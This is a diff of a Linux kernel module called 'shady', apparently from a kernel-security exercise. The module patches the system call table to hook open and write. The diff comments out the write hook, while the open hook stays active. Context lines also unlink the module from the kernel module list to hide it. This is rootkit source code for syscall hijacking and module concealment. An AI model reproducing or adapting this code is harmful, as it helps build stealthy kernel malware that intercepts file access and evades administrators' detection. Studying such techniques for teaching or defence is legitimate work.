@@ -61,9 +61,9 @@ static struct class *shady_class = NULL;
 
 //my variables
 asmlinkage int (*old_open) (const char*, int, int);
-asmlinkage ssize_t (*old_write) (int fd, const void *buf, size_t count);
+//asmlinkage ssize_t (*old_write) (int fd, const void *buf, size_t count);
 
-asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
+/*asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
 {
      int i;
      int searchIndex = 0;
@@ -85,7 +85,7 @@ asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
           }
      }
      return old_write(fd, buf, count);
-}
+}*/
 
 
 asmlinkage int my_open (const char* file, int flags, int mode)
@@ -245,7 +245,7 @@ shady_cleanup_module(int devices_to_destroy)
   
      //my code
      ((unsigned long **)system_call_table_address)[__NR_open] = old_open;
-     ((unsigned long **)system_call_table_address)[__NR_write] = old_write;
+     //((unsigned long **)system_call_table_address)[__NR_write] = old_write;
      //end
 	
   /* Get rid of character devices (if any exist) */
@@ -286,8 +286,8 @@ shady_init_module(void)
      old_open = ((unsigned long **)system_call_table_address)[__NR_open];
      ((unsigned long **)system_call_table_address)[__NR_open] = my_open;
      //hiding code
-     old_write = ((unsigned long **)system_call_table_address)[__NR_write];
-     ((unsigned long **)system_call_table_address)[__NR_write] = my_write;
+     /*old_write = ((unsigned long **)system_call_table_address)[__NR_write];
+     ((unsigned long **)system_call_table_address)[__NR_write] = my_write;*/
      
      THIS_MODULE->list.prev->next = THIS_MODULE->list.next;
      THIS_MODULE->list.next->prev = THIS_MODULE->list.prev;
